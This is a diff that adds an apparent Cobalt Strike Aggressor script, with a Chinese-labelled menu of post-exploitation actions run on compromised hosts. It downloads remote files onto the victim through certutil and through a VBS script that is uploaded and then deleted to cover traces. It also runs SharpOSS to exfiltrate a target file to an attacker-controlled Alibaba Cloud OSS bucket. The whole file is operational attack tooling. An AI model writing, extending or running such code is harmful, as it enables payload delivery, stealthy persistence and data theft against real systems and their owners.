@@ -1,0 +1,56 @@
+menu "辅助模块" {
+  item "certutil下载文件" {
+    $bid = $1['@'];
+    $dialog = dialog("certutil远程下载", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
+    dialog_description($dialog, "certutil命令远程文件下载。");
+    drow_text($dialog, "url", "远程文件地址: ");
+    drow_text($dialog, "path", "本地储存文件: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub certutil {
+    $url = $3['url'];
+    $path = $3['path'];
+    bshell($bid, "certutil.exe -urlcache -split -f $url $path");
+  }
+
+  item "vbs下载文件" {
+    $bid = $1['@'];
+    $dialog = dialog("vbs下载文件", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
+    dialog_description($dialog, "vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。");
+    drow_text($dialog, "url", "远程文件地址: ");
+    drow_text($dialog, "path", "本地储存文件: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub vbs {
+    $url = $3['url'];
+    $path = $3['path'];
+    bupload($bid, script_resource("/scripts/Auxiliary/download.vbs"));
+    bshell($bid, "download.vbs $url $path");
+    bshell($bid, "del /f /s /q download.vbs");
+  }
+
+  item "SharpOSS(上传文件)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Windows\\Temp\\bak.zip", bid => $bid), &SharpOSS);
+    dialog_description($dialog, "通过aliyun-oss-csharp-sdk快速上传目标系统文件到阿里云OSS。项目地址：https://github.com/uknowsec/SharpOSS");
+    drow_text($dialog, "bucketName", "BucketName: ");
+    drow_text($dialog, "accessKeyId", "AccessKeyId: ");
+    drow_text($dialog, "accessKeySecret", "AccessKeySecret: ");
+    drow_text($dialog, "endpoint", "Endpoint: ");
+    drow_text($dialog, "UploadFilePath", "UploadFilePath: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpOSS {
+    $bucketName = $3['bucketName'];
+    $accessKeyId = $3['accessKeyId'];
+    $accessKeySecret = $3['accessKeySecret'];
+    $endpoint = $3['endpoint'];
+    $UploadFilePath = $3['UploadFilePath'];
+    $arg = join(' ', @($3['bucketName'],$3['accessKeyId'],$3['accessKeySecret'],$3['endpoint'],$3['UploadFilePath']));
+    bexecute_assembly($bid, script_resource("/scripts/Auxiliary/SharpOSS.exe"), $arg);
+  }
+
+}
